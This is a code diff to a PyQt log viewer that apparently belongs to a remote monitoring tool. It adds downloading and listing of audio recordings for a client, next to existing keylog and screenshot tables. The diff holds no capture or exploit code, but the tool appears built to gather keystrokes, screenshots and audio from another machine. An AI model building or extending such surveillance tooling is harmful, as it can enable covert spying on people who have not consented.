@@ -39,6 +39,7 @@ class LogViewer(QWidget, logViewerUi):
 
         self.screenshotsTable.doubleClicked.connect(self.open_screenshot)
         self.keylogsTable.doubleClicked.connect(self.open_keylog)
+        self.audioTable.doubleClicked.connect(self.open_audio)
 
         # Init
         self.init_ui()
@@ -58,6 +59,7 @@ class LogViewer(QWidget, logViewerUi):
         # Hide Path Columns
         self.screenshotsTable.setColumnHidden(2, True)
         self.keylogsTable.setColumnHidden(2, True)
+        self.audioTable.setColumnHidden(1, True)
 
     def set_language(self):
         self.setWindowTitle(_('VIEWER_WINDOW_TITLE'))
@@ -110,7 +112,7 @@ class LogViewer(QWidget, logViewerUi):
         os.startfile(current_keylog_path)
 
     def open_audio(self):
-        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 2).text())
+        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 1).text())
         os.startfile(current_audio_path)
 
     def download_data(self):
@@ -208,8 +210,47 @@ class LogViewer(QWidget, logViewerUi):
             self.downloadedLabel.setHidden(True)
 
         # Download Audio
+        audio_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Audio')
+        if not os.path.exists(audio_dir):
+            os.makedirs(audio_dir)
+
+        # Download Audio
         if self.audioEnableButton.isChecked():
-            pass
+            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadAudios', self.session_id)
+            if count_data['mode'] == 'noDataFound':
+                return
+            all_data_count = count_data['mode']
+
+            # Prepar Progress Bar
+            self.downloadProgress.setHidden(False)
+            self.downloadedLabel.setHidden(False)
+            self.downloadedLabel.setText('Downloading Audios 0/%s' % all_data_count)
+            self.downloadProgress.setMaximum(int(all_data_count))
+            self.downloadProgress.setValue(0)
+
+            audio_name = count_data['payload']
+            self.audio_dict = {}
+            for index, name in enumerate(audio_name):
+                self.gui()
+                audio = data_get(self.socket, name, 'downloadAudio', self.session_id)
+                if audio['mode'] == 'noDataFound':
+                    continue
+                else:
+                    path = os.path.join(audio_dir, audio['payload']['datetime']+'.wav')
+                    with open(path, 'wb') as audio_file:
+                        audio_file.write(audio['payload']['raw'])
+                    self.audio_dict[audio['payload']['datetime']] = {
+                        'datetime': audio['payload']['datetime'],
+                        'date': audio['payload']['date'],
+                        'path': path,
+                    }
+                    # Update Progress
+                    self.downloadedLabel.setText('Downloading Audio %s/%s' % (index+1, all_data_count))
+                    self.downloadProgress.setValue(index+1)
+            # Finish
+            self.downloadedLabel.setText('Audio Downloading Finished')
+            self.downloadProgress.setHidden(True)
+            self.downloadedLabel.setHidden(True)
 
         # All Finished
         self.check_data_counts()
@@ -273,3 +314,16 @@ class LogViewer(QWidget, logViewerUi):
                 # add path
                 item = QTableWidgetItem(self.keylogs_dict[key]['path'])
                 self.keylogsTable.setItem(index, 2, item)
+
+        if len(self.audio_dict) > 0:
+            self.audioTable.setRowCount(len(self.audio_dict))
+            for index, key in enumerate(self.audio_dict):
+                self.gui()
+
+                # add datetime
+                item = QTableWidgetItem(self.audio_dict[key]['datetime'])
+                self.audioTable.setItem(index, 0, item)
+
+                # add path
+                item = QTableWidgetItem(self.audio_dict[key]['path'])
+                self.audioTable.setItem(index, 1, item)
